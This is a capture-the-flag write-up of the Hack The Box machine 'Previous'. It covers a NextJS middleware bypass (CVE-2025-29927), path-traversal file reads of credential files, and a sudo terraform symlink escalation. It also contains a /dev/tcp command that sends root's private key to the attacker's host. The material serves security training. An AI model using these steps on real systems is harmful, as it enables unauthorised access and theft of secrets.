This box starts you off with a NextJS web application, requiring you to footprint the NextJS version which is vulnerable to `CVE-2025-29927` that bypasses middleware authentication via the `X-Middleware-Subrequest` header. After bypassing authentication, the website grants you access to the `/doc` directory, which is vulnerable to file read inclusion. NextJS sensitive files reveal the credentials of `jeremy` to attain a foothold. Finally, abuse of `jeremy`'s `sudo terraform apply` allows escalation to root through improper filepath validation.


**nmap scan**

Only 2 ports are open, SSH and HTTP. SSH suggests that the host machine is running on Ubuntu 22.04 LTS.
```
┌──(geedorah㉿kali)-[~/Desktop/htb]
└─$ sudo nmap -sCV 10.129.242.162 -p 22,80
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-05 06:25 +0800
Nmap scan report for previous.htb (10.129.242.162)
Host is up (0.0048s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: PreviousJS
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.29 seconds


```

**Port 80**

Running feroxbuster. Nothing much besides traces of NextJS. 
```bash
┌──(geedorah㉿kali)-[~/Desktop/htb/medium/previous]
└─$ feroxbuster -u http://previous.htb -w /home/geedorah/SecLists/Discovery/Web-Content/common.txt  -t 20


404      GET        1l       66w     2181c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
308      GET        1l        1w       10c http://previous.htb/.git/logs/ => http://previous.htb/.git/logs
308      GET        1l        1w       17c http://previous.htb/_next/static/css/ => http://previous.htb/_next/static/css
308      GET        1l        1w       26c http://previous.htb/_next/static/chunks/pages/ => http://previous.htb/_next/static/chunks/pages
308      GET        1l        1w       20c http://previous.htb/_next/static/chunks/ => http://previous.htb/_next/static/chunks
308      GET        1l        1w       13c http://previous.htb/_next/static/ => http://previous.htb/_next/static
308      GET        1l        1w       35c http://previous.htb/_next/static/7-qBEQBKVgCxQr3ZJ-vvY/ => http://previous.htb/_next/static/7-qBEQBKVgCxQr3ZJ-vvY
308      GET        1l        1w        6c http://previous.htb/_next/ => http://previous.htb/_next
308      GET        1l        1w       12c http://previous.htb/application/ => http://previous.htb/application
200      GET        1l        1w     1305c http://previous.htb/_next/static/7-qBEQBKVgCxQr3ZJ-vvY/_buildManifest.js
200      GET        1l        2w       77c http://previous.htb/_next/static/7-qBEQBKVgCxQr3ZJ-vvY/_ssgManifest.js
200      GET        1l       60w     3028c http://previous.htb/_next/static/chunks/webpack-cb370083d4f9953f.js
200      GET        1l      283w     5101c http://previous.htb/_next/static/chunks/pages/index-a09f42904785092c.js
200      GET        1l      250w    23885c http://previous.htb/_next/static/css/9a1ff1f4870b5a50.css
200      GET        1l      725w    33690c http://previous.htb/_next/static/chunks/pages/_app-95f33af851b6322a.js
200      GET        1l     2125w   112594c http://previous.htb/_next/static/chunks/polyfills-42372ed130431b0a.js
200      GET        1l     2412w   119495c http://previous.htb/_next/static/chunks/main-0221d9991a31a63c.js
200      GET        1l     2734w   139924c http://previous.htb/_next/static/chunks/framework-ee17a4c43a44d3e2.js
200      GET        1l      407w     5493c http://previous.htb/
307      GET        1l        1w       49c http://previous.htb/api/experiments => http://previous.htb/api/auth/signin?callbackUrl=%2Fapi%2Fexperiments
307      GET        1l        1w       66c http://previous.htb/api/experiments/configurations => http://previous.htb/api/auth/signin?callbackUrl=%2Fapi%2Fexperiments%2Fconfigurations
307      GET        1l        1w       35c http://previous.htb/api => http://previous.htb/api/auth/signin?callbackUrl=%2Fapi
307      GET        1l        1w       36c http://previous.htb/apis => http://previous.htb/api/auth/signin?callbackUrl=%2Fapis
308      GET        1l        1w        8c http://previous.htb/cgi-bin/ => http://previous.htb/cgi-bin
307      GET        1l        1w       36c http://previous.htb/docs => http://previous.htb/api/auth/signin?callbackUrl=%2Fdocs
307      GET        1l        1w       38c http://previous.htb/docs51 => http://previous.htb/api/auth/signin?callbackUrl=%2Fdocs51
307      GET        1l        1w       38c http://previous.htb/docs41 => http://previous.htb/api/auth/signin?callbackUrl=%2Fdocs41
308      GET        1l        1w       29c http://previous.htb/render/https://www.google.com => http://previous.htb/render/https:/www.google.com
200      GET        1l      217w     8862c http://previous.htb/_next/static/chunks/0-c54fcec2d27b858d.js
200      GET        1l      136w     3480c http://previous.htb/_next/static/chunks/pages/signin-d0284ed11872b445.js
200      GET        1l      179w     3481c http://previous.htb/signin
[####################] - 10s     4771/4771    0s      found:30      errors:1
[####################] - 9s      4751/4751    506/s   http://previous.htb/

```


Browsing via the IP brings me to `previous.htb`. I'll add it to my /etc/hosts.
```
echo '10.129.242.162 previous.htb' >> /etc/hosts
```

The webpage has a login page.
![](../../images/previous/Pasted_image_20260605063216.png)

Browsing to a non-existent directory gives you an error 404 page, which is fingerprinted to be from NextJS.
![](../../images/previous/Pasted_image_20260605063556.png)


Taking a look at the source code also shows signs of NextJS components.
![](../../images/previous/Pasted_image_20260605063659.png)

The website has nothing more interesting than a login page at this point.



CVE-2025-29927
---

To further enumerate, I'll find out what NextJS version is being hosted on the website.

A clean way to get it is by running `window.next.version` in the website console under `inspect element`.

To find out a little more about this, if I browse to `http://previous.htb/_next/static/chunks/main-0221d9991a31a63c.js`  and search for the keyword `version` , I'll find this piece of js code.

This populates `window.next` with a version and a router object. It retrieves the version by reading a property from a defined object variable.
```
window.next={version:n.version,get router(){return n.router}
```
![](../../images/previous/Pasted_image_20260605070455.png)


As the JS is minified, it would be difficult to pinpoint the exact property that's defining the version number, but since I know it's being populated, I can retrieve it on the website via the dev console.


![](../../images/previous/Pasted_image_20260605065704.png)

If I search `15.2.2` in the minified main JS file, it gets defined here.
![](../../images/previous/Pasted_image_20260605071304.png)




Searching `next.js 15.2.2` on Google brings us to `CVE-2025-29927`, an authentication bypass exploit.
![](../../images/previous/Pasted_image_20260605071348.png)


This website goes into great detail about how the vulnerability works.
`https://projectdiscovery.io/blog/nextjs-middleware-authorization-bypass`

Based on the example given, if I were to include the header
`X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware`, I would effectively bypass the middleware authentication, which is the sole protection for previous.htb.
![](../../images/previous/Pasted_image_20260605072632.png)


I'll add it to my Burp Suite `Match and replace` rule.
![](../../images/previous/Pasted_image_20260605072829.png)

Now, any request that I send via Burp Suite will include this header, which allows us to bypass authentication.

I'll run feroxbuster again with the added header to see what new directories I can find.

There are new directories now. `http://previous.htb/docs` was not visible prior.
```bash
┌──(geedorah㉿kali)-[~/Desktop/htb/medium/previous]
└─$ feroxbuster -u http://previous.htb -w /home/geedorah/SecLists/Discovery/Web-Content/common.txt  -t 20 -H 'X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware'

404      GET        1l       66w     2181c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
308      GET        1l        1w       10c http://previous.htb/.git/logs/ => http://previous.htb/.git/logs
308      GET        1l        1w       20c http://previous.htb/_next/static/chunks/ => http://previous.htb/_next/static/chunks
308      GET        1l        1w       17c http://previous.htb/_next/static/css/ => http://previous.htb/_next/static/css
308      GET        1l        1w        6c http://previous.htb/_next/ => http://previous.htb/_next
308      GET        1l        1w       12c http://previous.htb/application/ => http://previous.htb/application
308      GET        1l        1w       13c http://previous.htb/_next/static/ => http://previous.htb/_next/static
308      GET        1l        1w       26c http://previous.htb/_next/static/chunks/pages/ => http://previous.htb/_next/static/chunks/pages
308      GET        1l        1w       35c http://previous.htb/_next/static/7-qBEQBKVgCxQr3ZJ-vvY/ => http://previous.htb/_next/static/7-qBEQBKVgCxQr3ZJ-vvY
200      GET        1l        2w       77c http://previous.htb/_next/static/7-qBEQBKVgCxQr3ZJ-vvY/_ssgManifest.js
200      GET        1l        1w     1305c http://previous.htb/_next/static/7-qBEQBKVgCxQr3ZJ-vvY/_buildManifest.js
200      GET        1l      283w     5101c http://previous.htb/_next/static/chunks/pages/index-a09f42904785092c.js
200      GET        1l       60w     3028c http://previous.htb/_next/static/chunks/webpack-cb370083d4f9953f.js
200      GET        1l      725w    33690c http://previous.htb/_next/static/chunks/pages/_app-95f33af851b6322a.js
200      GET        1l      250w    23885c http://previous.htb/_next/static/css/9a1ff1f4870b5a50.css
200      GET        1l     2412w   119495c http://previous.htb/_next/static/chunks/main-0221d9991a31a63c.js
200      GET        1l     2734w   139924c http://previous.htb/_next/static/chunks/framework-ee17a4c43a44d3e2.js
200      GET        1l     2125w   112594c http://previous.htb/_next/static/chunks/polyfills-42372ed130431b0a.js
200      GET        1l      407w     5493c http://previous.htb/
308      GET        1l        1w        8c http://previous.htb/cgi-bin/ => http://previous.htb/cgi-bin
308      GET        1l        1w        5c http://previous.htb/docs/ => http://previous.htb/docs
200      GET        1l      217w     8862c http://previous.htb/_next/static/chunks/0-c54fcec2d27b858d.js
200      GET        1l       91w     5893c http://previous.htb/_next/static/chunks/8-fd0c493a642e766e.js
200      GET        1l      124w     3663c http://previous.htb/_next/static/chunks/pages/docs-5f6acb8b3a59fb7f.js
200      GET        1l       38w     1467c http://previous.htb/docs/getting-started
200      GET        1l      181w     3353c http://previous.htb/docs
200      GET        1l       38w     1467c http://previous.htb/docs/examples
200      GET        1l       38w     1467c http://previous.htb/docs/api-reference
308      GET        1l        1w       29c http://previous.htb/render/https://www.google.com => http://previous.htb/render/https:/www.google.com
200      GET        1l      136w     3480c http://previous.htb/_next/static/chunks/pages/signin-d0284ed11872b445.js
200      GET        1l      179w     3481c http://previous.htb/signin
[####################] - 11s     4778/4778    0s      found:30      errors:1
[####################] - 10s     4751/4751    472/s   http://previous.htb/                                                                                                                                                                                                                         

```



Shell as jeremy
---
Browsing to the `/docs` directory brings me to a documentation page.
![](../../images/previous/Pasted_image_20260605081838.png)

If I check the Examples section, I am able to download the file.
![](../../images/previous/Pasted_image_20260605081951.png)

If I analyse the request in Burp Suite, the request being called is `/api/download?example=hello-world.ts`. This is a possible LFI vector.
![](../../images/previous/Pasted_image_20260605082042.png)


I can access `/etc/passwd` via directory traversal.
![](../../images/previous/Pasted_image_20260605082202.png)


Checking the environment variables of the web process `/proc/self/environ`, the root directory is hosted in `/app`. Since I know it's NextJS, I can refer to [HackTricks](https://hacktricks.wiki/en/network-services-pentesting/pentesting-web/nextjs.html)  on the useful files to exfiltrate.
![](../../images/previous/Pasted_image_20260605082330.png) 



![](../../images/previous/Pasted_image_20260605082440.png)



I can read the .env file at `/app/.env` that reveals NEXTAUTH_SECRET, which allows us to forge cookies via https://github.com/wunderwuzzi23/next-auth-cookie-tool. I've tried crafting a cookie as `admin`, but the website did not introduce any new functionality like an admin panel.


I can read `/app/.next/server/pages/api/auth/[...nextauth].js`, which actually shows the credentials for `Jeremy`!
![](../../images/previous/Pasted_image_20260605082756.png)

I am able to login as Jeremy via SSH.
```bash
┌──(geedorah㉿kali)-[~/…/htb/medium/previous/next-auth-cookie-tool]
└─$ sshpass -p 'MyNameIsJeremyAndILovePancakes' ssh jeremy@previous.htb
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-152-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Fri Jun  5 12:28:20 AM UTC 2026

  System load:  0.1               Processes:             217
  Usage of /:   79.1% of 8.76GB   Users logged in:       0
  Memory usage: 9%                IPv4 address for eth0: 10.129.242.162
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

1 update can be applied immediately.
1 of these updates is a standard security update.
To see these additional updates run: apt list --upgradable

1 additional security update can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Fri Jun 5 00:28:30 2026 from 10.10.16.30
jeremy@previous:~$

```

Getting Root
---


Running `sudo -l` on Jeremy shows I can run terraform with sudo under restricted parameters. One thing to take note of is the `!env_reset` flag, which will be crucial later, as it means I can inject environment variables into sudo.

```bash
jeremy@previous:~$ sudo -l
Matching Defaults entries for jeremy on previous:
    !env_reset, env_delete+=PATH, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User jeremy may run the following commands on previous:
    (root) /usr/bin/terraform -chdir\=/opt/examples apply
jeremy@previous:~$

```


As the sudo command only executes in the `/opt/examples` directory, I'll take a look.

The terraform files are owned by root, and I can only read them.
```bash
jeremy@previous:~$ cd /opt/examples
jeremy@previous:/opt/examples$ ls -la
total 28
drwxr-xr-x 3 root root 4096 Jun  5 00:54 .
drwxr-xr-x 5 root root 4096 Aug 21  2025 ..
-rw-r--r-- 1 root root   18 Apr 12  2025 .gitignore
-rw-r--r-- 1 root root  576 Aug 21  2025 main.tf
drwxr-xr-x 3 root root 4096 Aug 21  2025 .terraform
-rw-r--r-- 1 root root  247 Aug 21  2025 .terraform.lock.hcl
-rw-r--r-- 1 root root 1097 Jun  5 00:54 terraform.tfstate
jeremy@previous:/opt/examples$

```


Reading `main.tf`, it seems to take the `source_path` variable as a directory, and then redirect it to the destination_path.

It also shows the `source_path` variable. If it is not set, the default would be  `/root/examples/hello-world.ts`. There is also some validation involved regarding the `source_path` variable, where directory traversal attempts are blocked via `..` and the directory must contain `/root/examples`, but not necessarily the root directory. That means something like `/tmp/root/examples/evil` will pass through the validation, and combined with a symlink, I would be able to read any file I want.
```bash
jeremy@previous:/opt/examples$ cat main.tf
terraform {
  required_providers {
    examples = {
      source = "previous.htb/terraform/examples"
    }
  }
}

variable "source_path" {
  type = string
  default = "/root/examples/hello-world.ts"

  validation {
    condition = strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")
    error_message = "The source_path must contain '/root/examples/'."
  }
}

provider "examples" {}

resource "examples_example" "example" {
  source_path = var.source_path
}

output "destination_path" {
  value = examples_example.example.destination_path
}
jeremy@previous:/opt/examples$

```


Running the sudo command, it seems to have copied `/root/examples/hello-world.ts` to `/home/jeremy/docker/previous/public/examples/hello-world.ts`.

```bash
jeremy@previous:/opt/terraform-provider-examples/internal/provider$ sudo /usr/bin/terraform -chdir\=/opt/examples apply

Terraform has compared your real infrastructure against your configuration and found no differences, so no changes are needed.

Apply complete! Resources: 0 added, 0 changed, 0 destroyed.

Outputs:

destination_path = "/home/jeremy/docker/previous/public/examples/hello-world.ts"

jeremy@previous:/opt/terraform-provider-examples/internal/provider$ cat /home/jeremy/docker/previous/public/examples/hello-world.ts
import { app } from 'previous';

const app = new App();
app.start();

```

Putting this together,
I am able to define environment variables with sudo due to `!env_reset`. If I can find a way to define terraform variables for `source_path`, it will not use the default value.

[Hashicorp](https://developer.hashicorp.com/terraform/language/values/variables#environment-variables) provides a detailed documentation of how to define terraform environment variables.
![](../../images/previous/Pasted_image_20260605092014.png)

I can use `TF_VAR_source_path` to achieve this.

Specifying `/root/root.txt` shows that the validation rule blocked the path, which confirms the environment variable was successfully set.

```bash
jeremy@previous:/opt/terraform-provider-examples/internal/provider$ sudo TF_VAR_source_path=/root/root.txt /usr/bin/terraform -chdir\=/opt/examples apply
╷
│ Warning: Provider development overrides are in effect
│
│ The following provider development overrides are set in the CLI configuration:
│  - previous.htb/terraform/examples in /usr/local/go/bin
│
│ The behavior may therefore not match any released version of the provider and applying changes may cause the state to become incompatible with published releases.
╵
╷
│ Error: Invalid value for variable
│
│   on main.tf line 9:
│    9: variable "source_path" {
│     ├────────────────
│     │ var.source_path is "/root/root.txt"
│
│ The source_path must contain '/root/examples/'.
│
│ This was checked by the validation rule at main.tf:13,3-13.
╵

```


Following what I've pointed out earlier, I can create a directory at `/tmp/root/examples/evil`, and then create a symlink to read root's private key.
```bash
jeremy@previous:/tmp$ mkdir /tmp/root/examples/
mkdir: cannot create directory ‘/tmp/root/examples/’: No such file or directory
jeremy@previous:/tmp$ mkdir /tmp/root
jeremy@previous:/tmp$ mkdir /tmp/root/examples
jeremy@previous:/tmp$ ln -s /root/.ssh/id_rsa /tmp/root/examples/evil
jeremy@previous:/tmp$ ls -la /tmp/root/examples/evil
lrwxrwxrwx 1 jeremy jeremy 17 Jun  5 01:27 /tmp/root/examples/evil -> /root/.ssh/id_rsa
jeremy@previous:/tmp$

```


Now `/tmp/root/examples/evil` redirects to `/root/.ssh/id_rsa`.

Running the sudo command with `TF_VAR_source_path` set to `/tmp/root/examples/evil` shows I have successfully bypassed the validation, and it has written a file to `/home/jeremy/docker/previous/public/examples/evil`.

```bash
jeremy@previous:/tmp$ sudo TF_VAR_source_path=/tmp/root/examples/evil /usr/bin/terraform -chdir\=/opt/examples apply

Terraform will perform the following actions:

  # examples_example.example must be replaced
-/+ resource "examples_example" "example" {
      ~ destination_path = "/home/jeremy/docker/previous/public/examples/hello-world.ts" -> "/home/jeremy/docker/previous/public/examples/evil" # forces replacement
      ~ id               = "/home/jeremy/docker/previous/public/examples/hello-world.ts" -> "/home/jeremy/docker/previous/public/examples/evil"
      ~ source_path      = "/root/examples/hello-world.ts" -> "/tmp/root/examples/evil" # forces replacement
    }

Plan: 1 to add, 0 to change, 1 to destroy.

Changes to Outputs:
  ~ destination_path = "/home/jeremy/docker/previous/public/examples/hello-world.ts" -> "/home/jeremy/docker/previous/public/examples/evil"

Do you want to perform these actions?
  Terraform will perform the actions described above.
  Only 'yes' will be accepted to approve.

  Enter a value: yes

examples_example.example: Destroying... [id=/home/jeremy/docker/previous/public/examples/hello-world.ts]
examples_example.example: Destruction complete after 0s
examples_example.example: Creating...
examples_example.example: Creation complete after 0s [id=/home/jeremy/docker/previous/public/examples/evil]

Apply complete! Resources: 1 added, 0 changed, 1 destroyed.

Outputs:

destination_path = "/home/jeremy/docker/previous/public/examples/evil"
jeremy@previous:/tmp$

```


Checking the output of the file, I have access to root's private key.
```bash
jeremy@previous:/tmp/root/examples$ ls -la /home/jeremy/docker/previous/public/examples
total 12
drwxr-xr-x 2 jeremy jeremy 4096 Jun  5 01:30 .
drwxr-xr-x 3 jeremy jeremy 4096 Aug 21  2025 ..
-rw-r--r-- 1 root   root   2602 Jun  5 01:30 evil
jeremy@previous:/tmp/root/examples$ cat /home/jeremy/docker/previous/public/examples/evil
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAmxhpS4UBVdbNosrMXPuKzRSbCOTgUH0/Tp/Yb32hyiMyMT68JuwK
<SNIP>
-----END OPENSSH PRIVATE KEY-----
jeremy@previous:/tmp/root/examples$

```


After transferring `id_rsa` key to my machine, I can ssh in as root.
```bash

# Host machine
jeremy@previous:/tmp$ cat evil > /dev/tcp/10.10.16.30/4445



# Local machine
┌──(geedorah㉿kali)-[~/Desktop/htb/medium/previous]                     
└─$ nc -lp 4445 > rootkey

┌──(geedorah㉿kali)-[~/Desktop/htb/medium/previous]
└─$ chmod 600 rootkey
┌──(geedorah㉿kali)-[~/Desktop/htb/medium/previous]
└─$ ssh -i rootkey root@previous.htb
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-152-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Fri Jun  5 01:33:44 AM UTC 2026

  System load:  0.02              Processes:             221
  Usage of /:   79.0% of 8.76GB   Users logged in:       1
  Memory usage: 9%                IPv4 address for eth0: 10.129.242.162
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

1 update can be applied immediately.
1 of these updates is a standard security update.
To see these additional updates run: apt list --upgradable

1 additional security update can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Fri Jun 5 01:33:44 2026 from 10.10.16.30
root@previous:~# whoami
root
root@previous:~#

```

